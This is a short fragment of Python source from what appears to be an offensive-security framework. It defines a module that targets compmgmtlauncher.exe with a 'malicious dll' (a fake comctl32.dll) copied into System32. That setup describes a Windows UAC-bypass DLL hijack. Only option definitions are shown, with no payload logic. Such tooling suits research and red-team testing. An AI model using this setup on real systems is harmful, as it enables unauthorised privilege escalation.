...
class CustomModule(Module):
    def __init__(self):
        ...
        options = {"binary": ["compmgmtlauncher.exe", "Path to the vulnerable binary", True],
                   "malicious_dll": [r"C:\Users\ieuser\Desktop\uac-a-mola\uacamola\payloads\comctl32\comctl32.dll", "Path to a malicious dll", True],
                   "destination_path": [r"C:\Windows\System32", "Destination path", True],
